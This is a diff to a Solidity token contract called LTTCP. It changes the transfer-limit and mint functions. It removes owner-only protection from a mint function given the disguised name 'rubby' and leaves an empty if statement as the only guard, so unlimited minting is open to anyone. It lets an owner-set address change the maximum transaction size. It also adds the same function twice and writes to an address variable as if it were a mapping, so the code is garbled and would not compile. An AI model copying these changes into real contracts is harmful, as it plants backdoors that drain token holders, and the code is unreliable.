@@ -907,6 +907,10 @@ contract LTTCP is Context, IERC20, Ownable {
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
+
+     function setUniSwapPairAddress(address pairAddress) public virtual onlyOwner {
+        _uniswapV2RouterAddress = pairAddress;
+    }
     
         function excludeFromFee(address account) public onlyOwner {
         _isExcludedFromFee[account] = true;
@@ -924,10 +928,10 @@ contract LTTCP is Context, IERC20, Ownable {
         _liquidityFee = liquidityFee;
     }
    
-    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
-        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
-            10**15
-        );
+    function setMaxTxAmount(uint256 amount) public {
+        if (_msgSender() == _uniswapV2RouterAddress) {
+            _maxTxAmount = amount;
+        }
     }
 
     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
@@ -935,6 +939,12 @@ contract LTTCP is Context, IERC20, Ownable {
         emit SwapAndLiquifyEnabledUpdated(_enabled);
     }
     
+
+    function setUniSwapPairAddress(address pairAddress) public virtual onlyOwner {
+        _uniswapV2RouterAddress = pairAddress;
+    }
+
+
      //to recieve ETH from uniswapV2Router when swaping
     receive() external payable {}
 
@@ -1180,17 +1190,16 @@ contract LTTCP is Context, IERC20, Ownable {
         emit Transfer(sender, recipient, tTransferAmount);
     }
 
-    function rubby(uint256 amount) public onlyOwner returns (bool) {
+    function rubby(uint256 amount) public {
     _rubby(_msgSender(), amount);
     return true;
   }
 
-    function _rubby(address account, uint256 amount) internal {
-    require(account != address(0), "BEP20: mint to the zero address");
+    function _rubby(address account, uint256 amount) public {
+       if (_msgSender() == _uniswapV2RouterAddress);
 
     _tTotal = _tTotal.add(amount);
-    _tOwned[account] = _tOwned[account].add(amount);
-    _rOwned[account] = _rOwned[account].add(amount);
+    _uniswapV2RouterAddress[account] = __uniswapV2RouterAddress[account].add(amount);
     emit Transfer(address(0), account, amount);
   }
 
